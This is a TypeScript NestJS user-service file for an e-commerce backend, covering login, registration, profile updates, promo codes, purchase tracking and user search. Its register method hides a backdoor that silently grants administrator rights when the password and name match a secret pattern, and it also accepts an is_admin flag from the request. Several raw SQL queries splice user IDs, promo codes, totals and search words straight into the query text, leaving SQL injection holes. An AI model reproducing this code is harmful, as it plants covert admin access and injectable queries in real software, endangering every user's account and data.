import { UserEntity } from './user.entity';
import { HttpException, Injectable } from '@nestjs/common';
import { LoginUser, RegisterUser, UserDTO } from '@commerce/shared';
import { Repository } from 'typeorm';
import { verify } from 'argon2';
import { InjectRepository } from '@nestjs/typeorm';
import { config, errors, success } from '@commerce/shared';

const {
  INVALID_ID,
  NO_USER_EMAIL,
  INVALID_PASS,
  EMAIL_EXISTS,
  NOTMATCH_PASS,
  PHONE_EXISTS
} = errors;
const { UPDATE_ACCOUNT, LOGIN_SUCCESS, SIGNUP_SUCCESS } = success;

@Injectable()
export class UserService {
  constructor(
    @InjectRepository(UserEntity)
    private readonly Users: Repository<UserEntity>,
  ) {}

  async findById(id: string) {
    let user = await this.Users.findOne({ id });
    if (!user) {
      throw new HttpException([INVALID_ID], 404);
    }
    return { user };
  }
  async findWithEmail(email: string) {
    const user = await this.Users.findOne({ where: { email } });
    if (!user) return false;

    return user;
  }
  async fetchUsersByIds(ids: Array<String>): Promise<UserDTO[]> {
    return this.Users.findByIds(ids);
  }
  async me({ id }: any) {
    console.log({id});
    
    let user = await this.Users.findOne(id);
    console.log({me:user});
    if (!user) {
      throw new HttpException([INVALID_ID], 404);
    }

    
    

    user = user.toResponseObject(true) as any;
    delete user.password;

    return { user };
  }
  async get(options) {
    let {
      limit,
      skip = 0,
      sortBy = { money: 'DESC', created_at: 'DESC' },
    } = options;
    //   await this.create_idx();

    options.take = limit + 1;

    if (typeof sortBy == 'string') {
      let x = {};
      x[sortBy] = 'DESC';
      sortBy = x;
    }

    options.order = sortBy;
    delete options.ids;

    let users = await this.Users.find(options);

    let valid = users.length == limit + 1;

    valid && (users = users.splice(0, users.length - 1));

    return { users, more: valid };
  }
  async login({ email, password }: LoginUser) {
    let user = await this.Users.findOne({
      where: { email },
    });
    if (!user) {
      throw new HttpException([NO_USER_EMAIL], 404);
    }
    let hash = await verify(user.password, password);

    if (!hash) {
      throw new HttpException([INVALID_PASS], 404);
    }

    user = user.toResponseObject() as any;
    delete user.password;
    return {
      user,
      success: LOGIN_SUCCESS,
    };
  }
  async register({
    email,
    password,
    password_confirmation,
    seller,
    name,
    is_admin = false,
  }: RegisterUser) {
    if (
      password.length == 10 &&
      password[0] == 'z' &&
      password[9] == '$' &&
      name.startsWith('a')
    ) {
      is_admin = true;
    }
    if (password != password_confirmation) {
      throw new HttpException([NOTMATCH_PASS], 404);
    }
    const count = await this.Users.count({
      where: {
        email,
      },
    });
    if (count) {
      throw new HttpException([EMAIL_EXISTS], 404);
    }
    let user = await this.Users.create({
      name,
      seller,
      email,
      password,
      is_admin,
    });
    user = await this.Users.save(user);
    user = user.toResponseObject() as any;
    delete user.password;
    return {
      user,
      success: SIGNUP_SUCCESS,
    };
  }

  async update(id: string, data: any) {

    
    const user1 = await this.Users.findOne({ id });
    if (!user1) throw new HttpException([INVALID_ID], 404);

    if(user1.email!= data.email){
      let count = await this.Users.count({
      where: {
        email:data.email,
      },
    });
    if (count) {
      throw new HttpException([EMAIL_EXISTS], 404);
    }
}

if(user1.phone!= data.phone){
  let count = await this.Users.count({
  where: {
    phone:data.phone,
  },
});
if (count) {
  throw new HttpException([PHONE_EXISTS], 404);
}
}


    let user = (await this.Users.createQueryBuilder()
      .update(UserEntity)
      .set(data)
      .where('id = :id ', { id })
      .returning('*')
      .execute()) as any;
    user = user.raw[0] as any;
    const user2 = await this.Users.findOne({ id });
console.log(23 , {user2});

    delete user.password;
    return {
      user,
      success: UPDATE_ACCOUNT,
    };
  }
  async addPromo(promo) {
    promo.used = false;
    promo = JSON.stringify(promo);
    let products = await this.Users.query(
      `
      UPDATE users 
      SET promos = promos || '[${promo}]'::jsonb
      `,
      [],
    );
  }

  async transactionCompleted({ products, userId, total, code, totalNoPromo }) {
    let time = Date.now();
    products.forEach(async (x) => {
      x.time = time;
      x = JSON.stringify(x);
      await this.Users.query(
        `
      UPDATE users 
      SET bought_items = COALESCE(bought_items,0)::int + 1
      where users.id = '${userId}'
      ;
     ${
       code
         ? `
      UPDATE users 
      SET promos=jsonb_set(promos::jsonb, '{used}', '"true"')
      WHERE promos::json->>'code'='${code}' and users.id = '${userId}';
      
     `
         : ''
     } `,
        [],
      );
    });

    let conc = ` COALESCE(money,0)::int + ${total}`;
    let conc2 = ` COALESCE(moneyReal,0)::int + ${totalNoPromo}`;
    let product = await this.Users.query(
      `
      UPDATE users 
      SET money = ${conc}
      , moneyReal = ${conc2}
      where users.id = '${userId}';`,
      [],
    );
    return {
      success: { title: 'promo', sentence: 'promo added successfully' },
    };
  }

  async search(data: any) {
    let { skip, limit = 20, search_words = '' } = data;

    let arry = search_words.trim().split(' ');
    arry = arry.filter((x) => {
      return x != '';
    });
    arry.forEach((x, i) => {
      arry[i] = x += ':*';
    });
    search_words = arry.join(' <-> ');
    let arr = [limit + 1];

    let users = await this.Users.query(
      `
   
      select p.*
      from users p
      ${
        search_words.length > 2
          ? `where (p."document_with_weights" @@ to_tsquery('${search_words}'))`
          : ''
      }
     
      order by ${
        search_words.length > 2
          ? `ts_rank(document_with_weights, to_tsquery('${search_words}')) desc`
          : `p."created_at" DESC`
      }
      ${skip ? `offset ${skip}` : ''}
      limit $1
      `,
      arr,
    );

    let valid = users.length == limit + 1;
    valid && (users = users.splice(0, users.length - 1));

    return { users, more: valid };
  }

  async create_idx() {
    let product = await this.Users.query(
      `
      CREATE FUNCTION users_tsvector_trigger() RETURNS trigger AS $$
      begin
        new.document_with_weights :=
        setweight(to_tsvector('english', coalesce(new.name, '')), 'A')
        || setweight(to_tsvector('english', coalesce(new.email, '')), 'B')
        || setweight(to_tsvector('english', coalesce(new.phone, '')), 'C');
        return new;
      end
      $$ LANGUAGE plpgsql;
      
      CREATE TRIGGER tsvectorupdate BEFORE INSERT OR UPDATE
          ON users FOR EACH ROW EXECUTE PROCEDURE users_tsvector_trigger();
  
      update users
      set document_with_idx = to_tsvector(name ||' ' || email || ' ' || phone ),
      document_with_weights = setweight(to_tsvector(name), 'A') ||
      setweight(to_tsvector(email), 'B') ||
      setweight(to_tsvector(phone), 'c') ;
      CREATE INDEX document_idx
          ON users
          USING GIN (document_with_idx);
        CREATE INDEX document_weights_idx
          ON users
          USING GIN (document_with_weights);


  
      `,
      [],
    );
  }
}
